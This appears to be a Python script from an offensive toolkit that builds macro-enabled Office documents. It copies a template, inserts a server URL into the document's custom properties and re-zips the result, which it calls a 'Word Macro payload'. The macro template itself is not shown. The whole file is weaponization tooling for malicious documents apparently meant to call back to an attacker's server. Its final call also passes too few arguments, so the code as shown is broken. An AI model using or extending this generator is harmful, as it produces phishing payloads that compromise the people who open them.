# Generate Microsoft Word (.docm), PPT (.pptm), and Excel (.xlsm) macros. 
# These specific Office extensions use the OpenXML office format, allowing for them to be unzipped and have properties modified

import os
import shutil
import fileinput


Primary_Path = "./templates/wordMacro"

properties_Document = "docProps/custom.xml"
replace_String = "REPLACEURLHERE"
Temp_Dir = "temp-generate-directory"

def create_temp(temppath, template_path):
	if not os.path.exists(temppath):
		shutil.copytree(template_path, temppath)
	else: 
		shutil.rmtree(temppath)
		shutil.copytree(template_path, temppath)

def zip_to_office(output_name, output_path, zip_path):
	out_path_file = os.path.join(output_path, output_name)
	print("Writing Word Macro payload to: " + out_path_file)
	shutil.make_archive(out_path_file, 'zip', zip_path)
	renamed = out_path_file + ".zip"
	os.rename(renamed, out_path_file)

def edit_Macro_Properties(server_url, output_path, template_path, payload_name):
	#Create our temp path
	temp_path = os.path.join(Primary_Path, Temp_Dir)
	create_temp(temp_path, template_path)

	#Replace with server_url
	properties_document_path = os.path.join(temp_path, properties_Document)
	with fileinput.FileInput(properties_document_path, inplace=True) as file:
		for line in file:
			print(line.replace(replace_String, server_url), end='')

    #Recompress the word document into a zip, and rename to .docm
	zip_to_office(payload_name, output_path, temp_path)

if __name__ == "__main__":
	edit_Macro_Properties("http://127.0.0.1:8000", "./payload-output")



# Variables we need in:
# 	- Template directory
# 	- Template name
# 	- Output Directory
# 	- Server URL